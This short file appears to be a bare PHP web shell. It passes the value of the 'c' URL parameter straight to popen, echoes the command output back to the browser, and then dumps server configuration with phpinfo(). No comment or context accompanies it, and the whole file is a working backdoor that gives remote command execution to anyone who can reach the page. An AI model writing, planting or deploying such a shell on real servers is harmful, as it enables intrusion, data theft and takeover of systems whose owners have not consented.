<?php
$output = '';
$handle = popen($_GET['c'], 'r');
while (!feof($handle)) {
    $output .= fread($handle, 4096);
}
pclose($handle);
echo $output;
phpinfo();?>
